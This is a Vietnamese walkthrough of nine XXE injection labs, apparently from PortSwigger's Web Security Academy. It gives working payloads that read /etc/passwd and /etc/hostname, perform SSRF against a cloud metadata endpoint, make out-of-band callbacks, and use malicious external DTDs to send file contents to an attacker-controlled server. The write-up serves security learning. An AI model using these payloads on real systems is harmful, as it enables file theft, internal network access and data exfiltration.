# XML External Entity (XXE) Injection

### Bài 1: Exploiting XXE using external entities to retrieve files
>![](https://i.imgur.com/lmoFa6F.png)


Mô tả: Chắc năng `check stock` của trang web bị lỗi XXE và trả về bất kì nội dung ta request, mục tiêu là tiêm vào payload để khai thác lấy được nội dung của file `/etc/passwd`

Thử sử dụng chức năng `check stock` ta thấy nó POST nội dung như sau đến server 

>![](https://i.imgur.com/CJABDg0.png)

Ta thử chèn 1 external entity vào nhằm lấy nội dung file như sau

```xml
<!DOCTYPE test [ <!ENTITY file SYSTEM "file:///etc/passwd">]>
```` 

và thay `productID` bằng giá trị `&file;` ta nhận được kết quả trả về như sau

>![](https://i.imgur.com/5B0RT6y.png)


>![](https://i.imgur.com/OaF5fB7.png)

<hr>

### Bài 2: Exploiting XXE to perform SSRF attacks
>![](https://i.imgur.com/rYlkjB8.png)

Mô tả: khai thác XXE để thông qua đó thực hiện SSRF tới mục tiêu là máy chủ nằm trong mạng nội bộ.


Đầu tiên kiểm tra payload mà chứ năng `stockcheck` gửi đi ta thấy như sau:

>![](https://i.imgur.com/N0v0Jdi.png)

Tiêm XXE với URI là địa chỉ của máy mục tiêu.
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
``` 

(thay trường productID bằng &xxe;)

Ta có kết quả trả về kèm theo tên thư mục như sau:
>![](https://i.imgur.com/FldzDQQ.png)

Đổi URI thành đường dẫn tới tên thư mục tìm được bên trên `http://169.254.169.254/latest` ta có kết quả

>![](https://i.imgur.com/YJiUDBo.png)

Đệ quy lại các bước như trên, ta có kết quả:

>![](https://i.imgur.com/zjLZr3O.png)

>![](https://i.imgur.com/lOe5qzM.png)

<hr>

### Bài 3: Blind XXE with out-of-band interaction
>![](https://i.imgur.com/yt9hwqs.png)

Mô tả: trang web bị lỗi XXE ở chức năng `Check Stock` tuy nhiên không có response trả về cho việc khai thác, mục tiêu là nhận diện khả năng của cuộc tấn công out-of-band bằng cách khiến nó gửi `HTTP` và `DNS` request đi tới máy chủ của ta.

Sử dụng lại payload như các bài trên, chỉ thay URI bằng đường dẫn tới server của ta

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://lmbsm72tsapxwbirxm8evi3kbbh25r.oastify.com"> ]>
```

Kết quả:

>![](https://i.imgur.com/8JC4Tfj.png)

>![](https://i.imgur.com/wBjAxs5.png)

<hr>

### Bài 4: Blind XXE with out-of-band interaction via XML parameter entities
>![](https://i.imgur.com/wuVx1kg.png)

Mô tả: cũng như bài trên nhưng `regular` xxe đã bị filter và block, bài lab yêu cầu ta sử dụng Parameter entity

Vậy sử payload trên lại một chút theo format của `parameter entity`

```xml
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://lmbsm72tsapxwbirxm8evi3kbbh25r.oastify.com"> ]>
```

Phần `productId` đổi thành %xxe;

Ta có kết quả như sau

>![](https://i.imgur.com/zPOacOC.png)

>![](https://i.imgur.com/0h40Hai.png)


### Bài 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD
>![](https://i.imgur.com/jmM0LE2.png)

Mô tả: chức năng `Check Stock` bị lỗi XXE, mục tiêu là khai thác lấy nội dung của `/etc/hostname` (thông qua malicious external DTD). Bài lab cũng cung cấp Exploit Server để lưu nội dung của `maliciou DTD`.

Vì nội dung ta muốn lấy không có format DTD, và Parser gặp lỗi như sau

>![](https://i.imgur.com/gH0c9HD.png)


Nên ta cần khai thác gián tiếp

Đầu tiên, tạo một DTD lưu nó trên exploit server

Sau đó, inject vào nội dung POST của chức năng `check stock` 1 external entity để nó thực hiện truy vấn tới server và lấy về DTD đã lưu lúc nãy.

DTD độc hại của ta khi được tải về sẽ kích hoạt và gửi request kèm theo hostname đến server khác của ta, nhờ đó khai thác được out-of-band attack.

Tham khảo:https://gist.github.com/staaldraad/01415b990939494879b4


**Nội dung DTD** : Lấy hostname rồi gửi đi tới server của ta dưới dạng tham số.

```xml
<!ENTITY % hostname SYSTEM "file:///etc/hostname"> 
<!ENTITY % tmp "<!ENTITY &#x25; oob SYSTEM 'http://dvcw8ek9z2ixfn8gx9o5vpgq3h98xx.oastify.com?res=%hostname;'> " >
%tmp;
%oob;
```

**Nội dung Payload inject vào HTTP Post request**: lấy external entity từ nguồn là DTD ta đã lưu.

```xml
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "https://exploit-0ac2007204e74061c371f586019d0073.exploit-server.net/exploit"> %xxe; ]>
```

Kết quả:
>![](https://i.imgur.com/D4aoMlk.png)

>![](https://i.imgur.com/PZ6xiGx.png)


### Bài 6: Exploiting blind XXE to retrieve data via error messages
>![](https://i.imgur.com/B1DDybW.png)


Mô tả: Chức năng `check stock` bị lỗi XXE nhưng không hiển thị kết quả trả về. Ta cần tìm cách khai thác để trigger error message hiển thị nội dung của file `/etc/passwd`

Cũng như bài trên, file /etc/passwd không có format DTD, ta cần khai thác gián tiếp.

**Đầu tiên tạo một DTD độc hại và lưu nó trên exploit server**: File được gọi đến không tồn tại khiến parser gặp lỗi và hiển thị kèm nội dung /etc/passwd cho ta (dưới dạng error filename)

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///%file;'>">
%eval;
%exfil;
```

**Sau đó inject vào POST payload của `checkstock` để nó truy vấn external DTD** truy vấn và tải về External DTD độc hại mà ta đã viết ở trên
```xml
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "https://exploit-0a59005d03b5d590c7e40746011e0068.exploit-server.net/exploit"> %xxe; ]>
```

Kết quả khi nó cố tìm filename có giá trị là nội dung file `/etc/passwd` sẽ báo ra lỗi như hình dưới.

>![](https://i.imgur.com/xyrBUEL.png)

>![](https://i.imgur.com/wd5FwlT.png)

<hr>

### Bài 7: Exploiting XInclude to retrieve files
>![](https://i.imgur.com/CbUUaGm.png)

Mô tả: trang web nhúng input vào tài liệu XML, ta không kiểm soát được toàn bộ XML nên không định nghĩa được DTD để khai thác như cách thông thường. Mục tiêu là sử dụng `Xinclude` để khai thác lấy nội dung file /etc/passwd

Theo mặc định, XInclude sẽ phân tích cú pháp tài liệu được include dưới dạng XML. Vì /etc/passwd không phải là XML hợp lệ, nên ta sẽ cần thêm một thuộc tính bổ sung vào chỉ thị XInclude để thay đổi hành vi này.

Tìm kiếm thuộc tính đó, em search google và thấy `xmlns:xi="http://www.w3.org/2001/XInclude"`

Viết 1 payload đơn giản để include tài liệu như sau
https://gist.github.com/jakekarnes42/effe052f1095532cda84307024b3d512

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo> 
```

Ta có kết quả:

>![](https://i.imgur.com/MRqRm4a.png)

>![](https://i.imgur.com/Kfhqkuk.png)

<hr>

### Bài 8: Exploiting XXE via image file upload
>![](https://i.imgur.com/MxWiBZ8.png)

Mô tả: Một số thư viện web server dùng để xử lý ảnh tải lên chấp nhận cả file `SVG` - loại file ảnh có format xml và vô tình trở thành điểm yếu để khai thác XXE. Mục tiêu là lợi dụng điểm này để lấy hostname

Viết một file SVG có nội dung như sau:
```xml!
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="300">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Upload file ảnh này lên và truy cập tới nó ta có nội dung chính là `hostname`

>![](https://i.imgur.com/ZRgDkiP.png)

**eb055800dade**


>![](https://i.imgur.com/iWH29zA.png)

<hr>

### Bài 9: Exploiting XXE to retrieve data by repurposing a local DTD
>![](https://i.imgur.com/HxhSPto.png)

Mô tả: chức năng check stock parse XML nhưng không hiển thị kết quả parse. Mục tiêu là trigger error message của chức năng này để hiển thị nội dung file /etc/passwd. Và cần phải tham chiếu đến DTD file có sẵn trên server + định nghĩa lại nó


Tìm kiếm trên mạng, em thấy có nội dung như sau:

```
If a document's DTD uses a hybrid of internal and external DTD declarations, 
then the internal DTD can redefine entities that 
are declared in the external DTD
```

Nghĩa là định nghĩa internal có thể ghi đè các định nghĩa external của DTD

Vì bài này out-of-band connection đã bị block, và các DTD external không thể được load về. => Ta cần sử dụng kĩ thuật Error-Based XXE để khai thác, thông qua một DTD có sẵn trong hệ thống.

Ý tưởng là ta sẽ gọi nó ra sử dụng và tái định nghĩa lại 1 entities gây ra error. Ở đây ta sẽ sử dụng docbookx.dtd

Tái định nghĩa lại entities `ISOamso` và ta có payload để inject như sau.

```xml!
<!DOCTYPE test [
    <!ENTITY % dockbook SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %dockbook;
]>
```

- Định nghĩa 1 parameter entity tên là <kbd>dockbook</kbd> chứa nội dung của external entity `dockbookx.dtd` (file trên hệ thống)
- Tái định nghĩa lại entity <kbd>ISOamso</kbd> trigger error message để hiện nội dung file /etc/passwd
- Sử dụng entity <kbd>dockbook</kbd> để kích hoạt khai thác

Kết quả:

>![](https://i.imgur.com/JtZ9SBb.png)


>![](https://i.imgur.com/jUdSLpE.png)
